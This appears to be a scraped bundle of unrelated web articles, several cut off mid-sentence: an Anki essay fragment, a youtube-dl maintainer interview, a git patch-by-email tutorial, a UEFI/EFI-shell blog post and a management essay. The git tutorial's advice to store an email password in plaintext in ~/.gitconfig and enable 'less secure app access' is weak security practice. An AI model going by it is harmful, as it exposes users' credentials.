	Before we begin, a warning. Systems such as Anki are, in my
	opinion, powerful, and the early parts of the essay sound like
	a sales pitch.  It's certainly true that Anki has become an
	important part of my life. But it's also required a great deal
	of work to learn to use well. As we'll discuss, it required
	several failed attempts to make it worth using. So it's not a
	panacea; later, we'll discuss some shortcomings and possible
	improvements. That said, I do believe the underlying
	principles are powerful and important and deserve serious
	consideration.
      </p>
      -->
    
      <p>
	At first glance, Anki seems nothing more than a computerized
      flashcard program. You enter a question:
    </p>

   <p><img src="http://augmentingcognition.com/assets/Anki_question.png"></p><p>
      And a corresponding answer:
    </p>

    <p><img src="http://augmentingcognition.com/assets/Anki_answer.png"></p><p>
      Later you'll be asked to review the card: that is, shown the
      question, and asked whether you know the answer or not.
    </p>

    <p>
      What makes Anki better than conventional flashcards is that it
      manages the review schedule. If you can answer a question
      correctly, the time interval between reviews gradually
      expands. So a one-day gap between reviews becomes two days, then
      six days, then a fortnight, and so on. The idea is that the
      information is becoming more firmly embedded in your memory, and
      so requires less frequent review. But if you ever miss an
      answer, the schedule resets, and you again have to build up the
      time interval between reviews.
    </p>

    <p>
      While it's obviously useful that the computer manages the
      interval between reviews, it perhaps doesn't seem like that big
      a deal.  The punchline is that this turns out to be a far more
      efficient way to remember information.
    </p>

    <p>
      How much more efficient?
    </p>

    <p>
      To answer that question, let's do some rough time estimates.  On
      average, it takes me about 8 seconds to review a card. Suppose I
      was using conventional flashcards, and reviewing them (say) once
      a week. If I wanted to remember something for the next 20 years,
      I'd need 20 years times 52 weeks per year times 8 seconds per
      card. That works out to a total review time of just over 2 hours
      for each card.
    </p>

    <p>
      By contrast, Anki's ever-expanding review intervals quickly rise
      past a month and then out past a year. Indeed, for my personal
      set of Anki cards the average interval …</p></div></div>

Since this is an ongoing legal issue, that's all I'll say about that.</blockquote><p><strong>Are you going to change the examples in the source code and remove references to the copyrighted works of Icona Pop, Justin Timberlake and Taylor Swift?</strong></p><blockquote>I am no longer involved in the youtube-dl project, but if I were:</blockquote><blockquote>I would remove the test cases. These videos were never fully downloaded anyways; they are automated test cases where the test just downloads the first 10KB, which amounts to a couple of seconds at most. This is certainly fair use, but the project is fully functional without these test cases.</blockquote><blockquote>I would remove the referenced code, even though I believe it to be legal. It's an extremely small part of youtube-dl (which despite the name supports over 1000 other sites apart from YouTube) and not worth the trouble for me. I respect those who argue that the code should remain unchanged though, or that only music videos should be excluded.</blockquote><p><strong>Do you have any other comments about the incident?</strong></p><blockquote>youtube-dl is very valuable for many purposes: It enables video playback on devices where the web interface is not suitable (e.g. Raspberry Pis), it allows playback for disabled users, it powers research projects which analyze videos, and you can just watch videos when there may be no stable Internet connection. This should be unequivocally allowed and even supported for the good of society, while keeping the ability of content producers to benefit from their creations.</blockquote><blockquote>In my time as maintainer, I declined numerous requests to support piracy sites and DRM-protected content. I can not speak for the project in the last years, but from what I've seen that policy has remained. To me, this is the right policy any legal project should follow.</blockquote><blockquote>In some locations, judges seem to have interpreted the law to be something it does not say. It should be clarified – whether by judges or lawmakers – to what is written down already and was intended: Proper DRM should not be subverted except for archiving purposes, but anything else is clearly allowed. Personally, I would go so far to require DRM schemes to decode timestamp and licenses to enable archiving. That's not to say I think that DRM subversion should be illegal in the first place, but that's a political rather than a legal issue.</blockquote><blockquote>GitHub is in no way to blame. They hosted the project for free, and we should thank them for that. I can understand that some people don't want to deal with the RIAA – maybe they are not even located in the US – and simply move the source code somewhere else, but I greatly appreciate GitHub's services and support. I hope they can work with future maintainer of youtube-dl to get the project back on GitHub.</blockquote><blockquote>My thanks go to everybody who has contributed so far to youtube-dl, but especially to the current maintainer Sergey. I hope somebody takes up the flag, source code, and distribution of youtube-dl, but I understand if Sergey doesn't want to deal with all of this trouble. Due to other personal &amp; open-source commitments as well as the ongoing legal affairs, I'm sad it can't be me. I wish the project all the best.</blockquote><blockquote>Copyright law is always a balance between creators and society. When it comes to being able to watch videos no matter the device or Internet connection, and doing so for non-commercial purposes, the balance we should strive for seems clear to me; it should allow youtube-dl.</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>
<figure><figcaption><span>0001-Added-Tarun-Batra-to-contributors.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span>From 619814a3ac21012580e725136864e8397c14e20b Mon Sep 17 00:00:00 2001</span><br><span>From: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date: Tue, 20 Oct 2020 23:15:32 +0200</span><br><span>Subject: [PATCH] Added Tarun Batra to contributors</span><br><span></span><br><span></span><br><span> CONTRIBUTORS.txt | 1 +</span><br><span> 1 file changed, 1 insertion(+)</span><br><span></span><br><span>diff --git a/CONTRIBUTORS.txt b/CONTRIBUTORS.txt</span><br><span>index e69de29..1d12219 100644</span><br><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span></span><br><span><span>--</span></span><br><span>2.28.0</span><br></pre></td></tr></tbody></table></figure>
<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>
<figure><figcaption><span>git log</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>Author: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date:   Tue Oct 20 23:15:32 2020 +0200</span><br><span></span><br><span>    Added Tarun Batra to contributors</span><br><span></span><br><span>    Signed-off-by: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

<a href="https://oofhours.com/category/geeking-out/">Geeking Out</a>
	
	<section>

<p>Some people may think some of my past posts get into the weeds, exploring the technical depths of Windows Autopilot, Intune, Windows 10, ConfigMgr, etc.&nbsp; But I would say those generally only get to the 300-level – I will leave out the really deep stuff because it can be harder to explain, and some people just might not care.&nbsp; But every so often, in an effort to maintain my sanity, I like to dive into a new topic to prove that I am still capable of learning new stuff and spending more than 30 minutes on said topic.&nbsp; And in this case, anyone reading this blog post will be coming along for the ride.&nbsp; We’ll see how many people make it all the way to the “end of the road.”</p>



<p>So what’s the topic?&nbsp; Something that I <a href="https://blogs.technet.microsoft.com/mniehaus/2011/06/10/mdt-2012-beta-1-uefi-support/" target="_blank">started talking about almost 10 years ago</a>, the Unified Extensible Firmware Interface (UEFI).&nbsp; Back then, it was more of a warning:&nbsp; The way you deploy Windows is going to change.&nbsp; Now, it’s a way of life (and fortunately, it no longer sucks like it did back in 2010 when we first started working with it).</p>



<p>I don’t want to rehash the “why’s” behind UEFI because frankly, you no longer have much of a choice:&nbsp; All new Windows 10 devices ship with UEFI enabled by default (and if you are turning it off, shame on you).&nbsp; Instead, I want to focus much more on how it works and what’s going on behind the scenes.</p>



<h3>Chapter 1: The boot process</h3>



<p>According to <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_8_final.pdf" target="_blank">the UEFI spec</a> (which is a really hard to follow document), a device will initially start up and look for a particular file based on the architecture of the system:</p>



<figure><table><tbody><tr><td>Architecture</td><td>File</td></tr><tr><td>x86 (32-bit)</td><td>bootia32.efi</td></tr><tr><td>x64 (64-bit)</td><td>bootx64.efi</td></tr><tr><td>ARM (32-bit)</td><td>bootarm.efi</td></tr><tr><td>ARM (64-bit)</td><td>bootaa64.efi</td></tr></tbody></table></figure>



<p>It will look in the \EFI\BOOT folder on accessible FAT32 volumes for this file.&nbsp; (The firmware can only read FAT32 file systems.&nbsp; GPT disks are suggested, although interestingly enough MBR disks would probably work too, at least per the UEFI spec.)&nbsp; That’s effectively a fallback mechanism – if nothing else loaded, search out something.&nbsp; But once you’ve installed an OS on the device, it will create firmware entries that provide alternative choices; UEFI will work its way down the list until it successfully loads one.&nbsp; Here’s what you would see for that firmware order on a Hyper-V VM that’s already running Windows 10:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb.png" alt="image"></a></figure>



<p>Notice that the first entry in the list points to \EFI\Microsoft\Boot\bootmgfw.efi, the Microsoft-provided boot manager; it then decided what OS to boot from the BCD.&nbsp; An interesting fact:&nbsp; If you look at the bootmgfw.efi file and compare it against the bootx64.efi file (you’ll have to assign a drive letter to the EFI partition to see these files), you’ll notice that they are exactly the same size:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-1.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-1.png" alt="image"></a></figure>



<p>That’s not a coincidence – they are actually the exact same file.&nbsp; So whether it’s loaded as a “last resort” by the firmware (bootx64.efi) or by the explicit firmware entry doesn’t matter, it does the same thing either way.&nbsp; </p>



<p>The boot manager will then boot an OS based on the BCD entries.&nbsp; For a Windows 10 OS, there will be an entry in the BCD that points to a particular volume as well as the path of the Windows boot loader that actually boots the OS, which is typically \windows\system32\winload.efi on that volume.&nbsp; Here’s the entry from my laptop:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-2.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-2.png" alt="image"></a></figure>



<p>Behind the scenes, that “partition=c:” entry really points to the ID of the volume (since drive letter assignments depend on the OS mappings, not the BCD or loader); BCDEDIT is making it more friendly.&nbsp; When winload.efi is loaded, it will find the actual Windows kernel and load it, which starts the actual OS boot process.</p>



<p>There’s one other interesting file that can come into play, hvloader.efi.&nbsp; This one is tied to the “hypervisorlaunchtype” BCD setting about.&nbsp; This one is for the Hyper-V hypervisor.&nbsp; The winload.efi boot loader will check this setting and automatically load hvloader.efi to launch the hypervisor.&nbsp; The exact mechanism for that isn’t 100% clear to me – that was a rabbit hole I didn’t want to go down.&nbsp; </p>



<p>One other point worth mentioning in this process:&nbsp; If secure boot is enabled, all of the mentioned files will be checked to make sure that they are properly signed and unmodified.&nbsp; If the boot process gets far enough for the NTOS kernel to run, it will also perform verification of critical boot files.&nbsp; This is a key UEFI and Windows security feature, and why you should always run with UEFI and Secure Boot enabled, except when testing or playing (and we’ll do plenty of that later).</p>



<h3>Chapter 2: What are these EFI files anyway?</h3>



<p>I remember reading in the UEFI specifications a long time ago that UEFI used <a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface" target="_blank">“EFI byte code” (EBC)</a>.&nbsp; That would mean special tools, compilers, etc.&nbsp; Well, I was wrong.&nbsp; Yes, such a thing exists, but it’s primarily for cross-platform drivers, and apparently is not used very often.&nbsp; So these EFI files (like bootmgfw.efi) are just typical executables, and can be written in any language and compiled into something that’s pretty close to a standard binary.&nbsp; C and assembly language are the most common languages used, and both are used in the <a href="https://github.com/tianocore/edk2" target="_blank">source code for UEFI itself</a> (the EDK2 repository, part of the <a href="https://www.tianocore.org/" target="_blank">Tianocore project</a>).</p>



<p>At the moment at least, my interest isn’t in writing UEFI code.&nbsp; But there is one piece of UEFI code that would come in very handy to explore some of the “behind the scenes” operations of UEFI: the EFI shell.&nbsp; Think of this as a sort of “UEFI command prompt” that has a number of built-in commands for working with UEFI itself.&nbsp; The source code is included in the EDK2 project, it just needs to be built (compiled/linked).</p>



<p>OK, so how to build it?&nbsp; There are <a href="https://github.com/tianocore/tianocore.github.io/wiki/Windows-systems" target="_blank">some instructions in the Tianocore Github content</a>.&nbsp; Those instructions are OK, but not perfect.&nbsp; Here’s a high-level summary of what I did:</p>



<ul><li>Install Visual Studio 2019 (even though it isn’t listed as officially supported in the EDK2 documentation – that stops at Visual Studio 2017).&nbsp; Make sure you install the desktop development tools.&nbsp; (I included MSVC v141, which is the VS2017 version.&nbsp; I think that was necessary, just didn’t take the time to prove it.)</li><li>Install <a href="https://www.python.org/" target="_blank">Python 3.7</a> or later to C:\Program Files\Python37.&nbsp; Set a system environment variable PYTHON_HOME to “C:\Program Files\Python37” (without the quotes, without a trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Nasm-Setup" target="_blank">NASM open-source assembly compiler</a> to C:\Program Files\NASM.&nbsp; Set a system environment variable NASM_PREFIX to “C:\Program Files\NASM\” (without the quotes, with the trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Asl-Setup" target="_blank">ASL compiler</a> to C:\ASL</li><li>Install <a href="http://git-scm.com/download/win" target="_blank">Git GUI</a>.&nbsp; </li><li>Clone the EDK2 repository from Git GUI, specifying a source location of <a title="https://github.com/tianocore/edk2.git" href="https://github.com/tianocore/edk2.git">https://github.com/tianocore/edk2.git</a> and a target of C:\EDK2.</li><li>Edit the “C:\EDK2\Conf\target.txt” file to specify the following values:
<p>ACTIVE_PLATFORM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = MdeModulePkg/MdeModulePkg.dsc<br>TARGET_ARCH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = X64</p></li></ul>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat Rebuild”.</li><li>Run “build”.</li></ul>



<p>If all of that works, you should then have a full build of the main UEFI code.&nbsp; But you still won’t have the UEFI shell.&nbsp; So a little more is required:</p>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat”.</li><li>Run “build -p ShellPkg\ShellPkg.dsc”</li></ul>



<p>After doing that, you should find the resulting shell.efi file in C:\EDK2\Build\Shell\DEBUG_VS2017\X64\ShellPkg\Application\Shell\Shell\DEBUG.&nbsp; Now, let’s try to use it…</p>



<h3>Chapter 3: Booting to the EFI shell </h3>



<p>Let’s start off with something really simple:&nbsp; A brand-new VM with no operating system on it.&nbsp; Based on the previous discussions, all we should need to do is create a FAT32 disk, place the EFI file in the right place, and then boot.&nbsp; So let’s try it.&nbsp; Here are the steps:</p>



<ul><li>Create a new VM in Hyper-V (4GB RAM, a small expanding VHDX, gen 2, two processors – typical stuff).&nbsp; Don’t start it yet.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-3.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-3.png" alt="image"></a></figure>



<ul><li>Find the VHDX file in File Explorer and double-click it to mount it.&nbsp; You’ll get a message like this:</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-4.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-4.png" alt="image"></a></figure>



<ul><li>Do as it says: Open Disk Management, initialize the disk, and then create a small FAT32 partition.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-5.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-5.png" alt="image"></a></figure>



<ul><li>It should look like this (the E: drive):</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-6.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-6.png" alt="image"></a></figure>



<ul><li>Navigate to the drive (E: from my example) in File Explorer.&nbsp; Create an E:\EFI\BOOT folder structure, then copy the shell.efi file into it, renaming it to bootx64.efi (remember that from above?).</li></ul>



<blockquote><p> Directory of e:\EFI\BOOT</p><p>09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br>
09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..<br>
09/01/2019&nbsp; 12:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bootx64.efi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bytes</p></blockquote>



<p>Right-click on the drive (e.g. E:\) in File Explorer and eject it (which unmounts it).</p>



<p>Now you can start the VM – and see it fail with an error like this:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-7.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-7.png" alt="image"></a></figure>



<p>That’s actually a good sign: The UEFI firmware attempted to load the EFI shell (shell.efi renamed to bootx64.efi), but it failed.&nbsp; Any guesses as to why from the error message on the screen, “unsigned image’s hash is not allowed”?&nbsp; Simple, it’s a Secure Boot error.&nbsp; The EFI executable isn’t signed by Microsoft – actually it isn’t signed at all.&nbsp; So to get it to run, we need to turn off Secure Boot.&nbsp; Turn off the VM and change the setting:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-8.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-8.png" alt="image"></a></figure>



<p>Apply the change, then start the VM again.&nbsp; Now we see something much better:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-9.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-9.png" alt="image"></a></figure>



<p>As you can see in that output, the device is running UEFI shell 2.2 (the most recent version of the spec), UEFI 2.7 (pretty recent, there is a 2.8 version now), and Microsoft is the vendor (as expected in Hyper-V).&nbsp; If you look at a directory of the FS0: volume:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-10.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-10.png" alt="image"></a></figure>



<p>You can see that it is the FAT32 volume that we prepared before, with the renamed shell.efi loaded by the virtual machine automatically.</p>



<p>See page 92 of <a href="https://uefi.org/sites/default/files/resources/UEFI_Shell_2_2.pdf" target="_blank">the UEFI Shell 2.2 spec</a> for all the commands that are accepted.&nbsp; The one that I am most interested in is “dmpstore” because it will dump out all of the UEFI variables.&nbsp; You can specify that you want all variables (-all), and that you want to page through them on the screen (-b, useful to see the names on the screen).&nbsp; Here’s an example from …</p></section></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You’re a developer working on the Foobar feature at company X. Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation 